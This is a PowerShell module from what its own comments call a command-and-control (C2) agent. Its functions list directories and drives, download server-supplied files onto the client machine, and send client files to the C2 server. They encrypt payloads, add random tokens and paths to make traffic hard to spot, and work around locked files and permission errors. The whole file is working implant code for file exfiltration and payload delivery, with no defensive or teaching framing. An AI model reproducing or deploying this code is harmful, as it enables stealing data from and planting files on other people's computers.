# File Operations Module for Kinetic Compliance Matrix Agent
# This module provides functions for file system navigation, upload, and download

function Get-DirectoryListing {
    <#
    .SYNOPSIS
        Gets directory listing with better formatting for C2 interface
    .DESCRIPTION
        Lists files and folders in the specified directory with detailed information
    .PARAMETER DirectoryPath
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath
    )
    
    try {
        # Expand environment variables if present
        if ($DirectoryPath -match '%\w+%') {
            $DirectoryPath = [System.Environment]::ExpandEnvironmentVariables($DirectoryPath)
        }
        
        # Log the expanded path
        Write-Host "Listing directory: $DirectoryPath"
        
        # Check if directory exists
        if (-not (Test-Path -Path $DirectoryPath -PathType Container)) {
            return "Error: Directory not found: $DirectoryPath"
        }
        
        # Get items with error handling
        try {
            $items = Get-ChildItem -Path $DirectoryPath -Force -ErrorAction Stop | 
            Select-Object Name, Length, LastWriteTime, Attributes, @{
                Name = "Type";
                Expression = {
                    if ($_.PSIsContainer) { "Directory" } else { "File" }
                }
            }
            
            # Convert to JSON for structured display in C2 interface
            $jsonResult = ConvertTo-Json -InputObject $items -Compress -Depth 2
            # Log first 100 chars of result
            Write-Host "Listing result (first 100 chars): $($jsonResult.Substring(0, [Math]::Min(100, $jsonResult.Length)))"
            return $jsonResult
        }
        catch {
            # Try a simpler approach if the first method fails
            Write-Host "Standard method failed, trying alternative approach: $_"
            $result = @()
            
            # Manually create directory entries
            foreach ($item in (Get-ChildItem -Path $DirectoryPath -Force -ErrorAction SilentlyContinue)) {
                $type = if ($item.PSIsContainer) { "Directory" } else { "File" }
                $size = if ($item.PSIsContainer) { 0 } else { $item.Length }
                
                $entry = @{
                    "Name" = $item.Name
                    "Type" = $type
                    "Length" = $size
                    "LastWriteTime" = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                    "Attributes" = $item.Attributes.ToString()
                }
                $result += $entry
            }
            
            # Convert to JSON and return
            $jsonResult = ConvertTo-Json -InputObject $result -Compress -Depth 2
            return $jsonResult
        }
    }
    catch {
        Write-Host "Error listing directory: $_"
        return "Error listing directory: $_"
    }
}

# Function to configure a web client with proper settings
function New-ConfiguredWebClient {
    $webClient = New-Object System.Net.WebClient
    
    # Set User-Agent
    $webClient.Headers.Add("User-Agent", $userAgent)
    
    # Set proxy if enabled
    if ($proxyEnabled -and $global:proxyInstance) {
        $webClient.Proxy = $global:proxyInstance
    }
    
    # Add authentication credentials if configured
    if ($useCredentials) {
        $credentials = New-Object System.Net.NetworkCredential($username, $password)
        $webClient.Credentials = $credentials
    }
    
    return $webClient
}

function Upload-File {
    <#
    .SYNOPSIS
        Uploads a file from server to client
    .DESCRIPTION
        Downloads a file from the C2 server and saves it to the specified path on the client
    .PARAMETER SourcePath
        Path to the file on the server
    .PARAMETER DestinationPath
        Path where the file should be saved on the client
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SourcePath,
        
        [Parameter(Mandatory=$true)]
        [string]$DestinationPath
    )
    
    try {
        # Expand environment variables if present in destination path
        if ($DestinationPath -match '%\w+%') {
            $DestinationPath = [System.Environment]::ExpandEnvironmentVariables($DestinationPath)
            Write-Host "Expanded destination path: $DestinationPath"
        }
        
        # Make sure the destination path ends with a filename, not just a directory
        if ($DestinationPath.EndsWith('\') -or $DestinationPath.EndsWith('/')) {
            # If only a directory was provided, append the source filename
            $filename = if ($SourcePath -match '[\\/]([^\\/]+)$') {
                # Extract filename from source path
                $matches[1]
            } else {
                # Use source path as filename if it doesn't contain path separators
                $SourcePath
            }
            
            # Append filename to destination path
            $DestinationPath = Join-Path -Path $DestinationPath -ChildPath $filename
            Write-Host "Appended filename to destination path: $DestinationPath"
        }
        
        # Create destination directory if it doesn't exist
        $destinationDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
        if (-not (Test-Path -Path $destinationDir -PathType Container)) {
            Write-Host "Creating directory: $destinationDir"
            try {
                New-Item -Path $destinationDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
            }
            catch {
                Write-Host "Error creating directory: $_"
                # If we can't create the directory, try a fallback location
                $tempFolder = [System.IO.Path]::GetTempPath()
                $filename = [System.IO.Path]::GetFileName($DestinationPath)
                $DestinationPath = Join-Path -Path $tempFolder -ChildPath $filename
                Write-Host "Using fallback destination: $DestinationPath"
            }
        }
        
        # Create file request JSON
        $fileRequest = @{
            FilePath = $SourcePath
            Destination = $DestinationPath
        }

        # Convert to JSON
        $requestJson = ConvertTo-Json -InputObject $fileRequest -Compress
        Write-Host "Request JSON: $requestJson"
        
        # Get a random path for file operation
        $filePath = Get-RandomPath -ForFileOperation
        Write-Host "Using random file operation path: $filePath"
        
        # Encrypt the request
        $encryptedRequest = Encrypt-Data -PlainText $requestJson
        
        # Prepare the payload with proper JSON structure
        $payload = @{
            d = $encryptedRequest  # Shortened from 'data'
            t = Get-RandomToken     # Shortened from 'token'
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        # Convert payload to JSON with proper handling
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress -Depth 4
        
        # Create a web client
        $webClient = New-Object System.Net.WebClient
        
        # Set User-Agent
        $webClient.Headers.Add("User-Agent", $userAgent)
        
        # Set proxy if enabled
        if ($proxyEnabled -and $global:proxyInstance) {
            $webClient.Proxy = $global:proxyInstance
        }
        
        # Add authentication credentials if configured
        if ($useCredentials) {
            $credentials = New-Object System.Net.NetworkCredential($username, $password)
            $webClient.Credentials = $credentials
        }
        
        # Explicitly set content type
        $webClient.Headers.Add("Content-Type", "application/json")
        
        # Send the request
        $requestUrl = "http://$serverAddress$filePath"
        Write-Host "Sending file request to $requestUrl"
        
        # ===== ERROR HANDLING AND DEBUG CODE =====
        try {
            # Send the request
            $response = $webClient.UploadString($requestUrl, $payloadJson)
            
            # Debug the response 
            Write-Host "DEBUG: Response length: $($response.Length) chars"
            Write-Host "DEBUG: Response preview: $($response.Substring(0, [Math]::Min(50, $response.Length)))"
            
            # Parse and decrypt the response
            try {
                $responseObj = $null
                
                # Check if response is valid JSON by trying to parse it
                $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
                
                # Process based on presence of 'd' field
                if ($responseObj.PSObject.Properties.Name -contains 'd') {
                    $encryptedData = $responseObj.d
                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedData
                }
                else {
                    # Try direct decryption as fallback
                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
                }
                
                # Try to parse the decrypted response as JSON
                $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
                
                # Check if file was found
                if ($fileResponse.Status -eq "Error") {
                    return "Error: $($fileResponse.Message)"
                }
                
                # Get file content and save it
                $fileContent = [System.Convert]::FromBase64String($fileResponse.FileContent)
                
                # Write bytes to file with error handling
                try {
                    # Write file with proper path verification
                    Write-Host "Writing to file: $DestinationPath"
                    
                    # Create parent directory if needed
                    $parentDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
                    if (-not [string]::IsNullOrEmpty($parentDir) -and -not (Test-Path -Path $parentDir -PathType Container)) {
                        Write-Host "Creating parent directory: $parentDir"
                        New-Item -Path $parentDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
                    }
                    
                    # Write the file
                    [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
                    Write-Host "File successfully written to $DestinationPath"
                }
                catch [System.UnauthorizedAccessException] {
                    # Permission issue - fall back to temp
                    Write-Host "Permission denied, falling back to temp folder"
                    $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
                    Write-Host "New path: $newPath"
                    [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                    $DestinationPath = $newPath
                    Write-Host "File successfully written to $DestinationPath"
                }
                catch [System.IO.DirectoryNotFoundException] {
                    # Directory not found - create it or fall back to temp
                    Write-Host "Directory not found, attempting to create it"
                    try {
                        $dirPath = [System.IO.Path]::GetDirectoryName($DestinationPath)
                        New-Item -Path $dirPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
                        [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
                        Write-Host "File successfully written after creating directory: $DestinationPath"
                    }
                    catch {
                        # Fall back to temp directory
                        Write-Host "Failed to create directory, falling back to temp folder"
                        $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
                        [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                        $DestinationPath = $newPath
                        Write-Host "File successfully written to $DestinationPath"
                    }
                }
                catch {
                    # General error - try alternative method with stream
                    Write-Host "Error writing file, trying alternate method: $_" 
                    try {
                        # Try to use FileStream instead
                        $fileStream = New-Object System.IO.FileStream($DestinationPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
                        $fileStream.Write($fileContent, 0, $fileContent.Length)
                        $fileStream.Close()
                        $fileStream.Dispose()
                        Write-Host "File successfully written using FileStream: $DestinationPath"
                    }
                    catch {
                        # Fall back to temp directory as last resort
                        Write-Host "All write attempts failed, falling back to temp folder: $_"
                        $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath) -replace '[^\w\.-]', '_')
                        [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                        $DestinationPath = $newPath
                        Write-Host "File successfully written to $DestinationPath"
                    }
                }
                
                return "Successfully downloaded $($fileResponse.FileName) ($($fileResponse.FileSize) bytes) to $DestinationPath"
            }
            catch {
                Write-Host "Error processing server response: $_"
                return "Error processing server response: $_"
            }
        }
        catch {
            Write-Host "Error processing server response: $_"
            return "Error downloading file from server: $_"
        }
    }
    catch {
        Write-Host "Error in file upload process: $_"
        return "Error uploading file: $_"
    }
}

# Function to upload a file from the client to the server
function Download-File {
    <#
    .SYNOPSIS
        Uploads a file from the client to the server
    .DESCRIPTION
        Sends a file from the client to the C2 server
    .PARAMETER FilePath
        Path to the file on the client to upload
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    
    try {
        # Expand environment variables if present in source path
        if ($FilePath -match '%\w+%') {
            $FilePath = [System.Environment]::ExpandEnvironmentVariables($FilePath)
        }
        
        # Check if file exists
        if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
            return "Error: File not found: $FilePath"
        }
        
        # Try to read file with proper error handling for locked files
        $fileBytes = $null
        try {
            # First attempt: standard read
            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        }
        catch [System.IO.IOException] {
            Write-Host "File is in use, trying alternative read method"
            try {
                # Second attempt: Open with FileShare.ReadWrite to allow reading even if file is in use
                $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                $memStream = New-Object System.IO.MemoryStream
                $fileStream.CopyTo($memStream)
                $fileBytes = $memStream.ToArray()
                $fileStream.Close()
                $memStream.Close()
            }
            catch {
                # Third attempt: try to make a copy of the file first
                Write-Host "Alternative read failed, trying to make a copy first"
                $tempFile = [System.IO.Path]::GetTempFileName()
                Copy-Item -Path $FilePath -Destination $tempFile -Force
                $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
                Remove-Item -Path $tempFile -Force
            }
        }
        
        # If we still couldn't read the file, return an error
        if ($null -eq $fileBytes) {
            return "Error: Could not read file content - file may be locked or in use"
        }
        
        # Convert to base64
        $fileContent = [System.Convert]::ToBase64String($fileBytes)
        
        # Prepare file upload data
        $fileData = @{
            FileName = (Split-Path -Path $FilePath -Leaf)
            FileContent = $fileContent
            FileSize = $fileBytes.Length
            SourcePath = $FilePath
            Description = "File uploaded from client"
        }
        
        # Create the operation payload
        $operationPayload = @{
            "op_type" = "file_up"    # Must be file_up for client->server transfer
            "payload" = $fileData
        }
        
        # Convert to JSON
        $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
        
        # Encrypt the data
        $encryptedData = Encrypt-Data -PlainText $operationJson
        
        # Create web client
        $webClient = New-WebClient
        
        # Prepare the payload
        $payload = @{
            d = $encryptedData        # Data field
            t = Get-RandomToken       # Token padding
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress
        
        # Get a random path for file operation
        $uploadPath = Get-RandomPath -ForFileOperation
        Write-Host "Using random file operation path: $uploadPath"
        
        # Construct the upload URL with validated server address
        if ([string]::IsNullOrEmpty($global:serverAddress) -or $global:serverAddress -eq "/" -or $global:serverAddress -eq "//") {
            Write-Host "Warning: Server address is empty or invalid. Setting to localhost."
            $global:serverAddress = "localhost"
        }
        
        # Remove any trailing slashes to prevent URL formatting issues
        if ($global:serverAddress.EndsWith("/")) {
            $global:serverAddress = $global:serverAddress.TrimEnd('/')
            Write-Host "Removed trailing slash from server address: $global:serverAddress"
        }
        
        # Construct the upload URL
        $uploadUrl = "http://$($global:serverAddress)$uploadPath"
        Write-Host "Sending file upload to $uploadUrl"
        
        # Debug information to help diagnose URL issues
        Write-Host "Server address: $($global:serverAddress)"
        Write-Host "Upload path: $uploadPath"
        Write-Host "File size: $($fileBytes.Length) bytes"
        
        try {
            $response = $webClient.UploadString($uploadUrl, $payloadJson)
            
            # Parse and process the response if present
            if ($response -and $response.StartsWith('{')) {
                try {
                    $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
                    
                    if ($responseObj.d) {
                        # Decrypt the response
                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObj.d
                        $responseData = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
                        
                        if ($responseData.Status -eq "Success") {
                            return "Successfully uploaded $FilePath to server ($($fileBytes.Length) bytes): $($responseData.Message)"
                        }
                        else {
                            return "Upload completed with status: $($responseData.Status) - $($responseData.Message)"
                        }
                    }
                }
                catch {
                    Write-Host "Error processing response: $_"
                }
            }
            
            # If we couldn't parse the response or there was no structured response
            return "Successfully uploaded $FilePath to server ($($fileBytes.Length) bytes)"
        }
        catch {
            Write-Host "Error sending file upload: $_"
            return "Error uploading file: $_"
        }
    }
    catch {
        Write-Host "Error in file upload operation: $_"
        return "Error uploading file: $_"
    }
}

# Other utility functions remain unchanged

function Get-DriveInfo {
    <#
    .SYNOPSIS
        Gets information about available drives
    .DESCRIPTION
        Returns detailed information about all available drives
    #>
    try {
        $drives = Get-CimInstance -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
            [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Fixed"
                SizeGB = [math]::Round($_.Size / 1GB, 2)
                FreeSpaceGB = [math]::Round($_.FreeSpace / 1GB, 2)
                PercentFree = [math]::Round(($_.FreeSpace / $_.Size) * 100, 2)
            }
        }
        
        # Add removable drives
        Get-CimInstance -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
            $drives += [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Removable"
                SizeGB = if ($_.Size) { [math]::Round($_.Size / 1GB, 2) } else { 0 }
                FreeSpaceGB = if ($_.FreeSpace) { [math]::Round($_.FreeSpace / 1GB, 2) } else { 0 }
                PercentFree = if ($_.Size -gt 0) { [math]::Round(($_.FreeSpace / $_.Size) * 100, 2) } else { 0 }
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $drives -Compress
        return $jsonResult
    }
    catch {
        return "Error getting drive information: $_"
    }
}

function Get-FileOwner {
    <#
    .SYNOPSIS
        Gets the owner of a file or directory
    .DESCRIPTION
        Returns the owner of the specified file or directory
    .PARAMETER Path
        Path to the file or directory
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        $acl = Get-Acl -Path $Path -ErrorAction SilentlyContinue
        if ($acl) {
            return $acl.Owner
        } else {
            return "Unknown"
        }
    }
    catch {
        return "Unknown"
    }
}

function Get-FileSystemItems {
    <#
    .SYNOPSIS
        Gets file system items (files and folders) with detailed information
    .DESCRIPTION
        Provides a detailed listing of files and folders in the specified directory
    .PARAMETER Path
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        # Expand environment variables if present
        if ($Path -match '%\w+%') {
            $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
        }
        
        # Check if directory exists
        if (-not (Test-Path -Path $Path -PathType Container)) {
            return "Error: Directory not found: $Path"
        }
        
        # Get items with error handling
        $itemsInfo = Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $type = if ($_.PSIsContainer) { "Directory" } else { "File" }
            $size = if ($_.PSIsContainer) { "N/A" } else { $_.Length }
            $extension = if ($_.PSIsContainer) { "" } else { $_.Extension }
            
            # Create object with properties
            [PSCustomObject]@{
                Name = $_.Name
                FullPath = $_.FullName
                Type = $type
                Size = $size
                Extension = $extension
                Created = $_.CreationTime
                Modified = $_.LastWriteTime
                Attributes = $_.Attributes.ToString()
                IsHidden = $_.Attributes -band [System.IO.FileAttributes]::Hidden
                IsSystem = $_.Attributes -band [System.IO.FileAttributes]::System
                IsReadOnly = $_.Attributes -band [System.IO.FileAttributes]::ReadOnly
                Owner = (Get-FileOwner -Path $_.FullName)
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $itemsInfo -Depth 3 -Compress
        return $jsonResult
    }
    catch {
        return "Error getting file system items: $_"
    }
}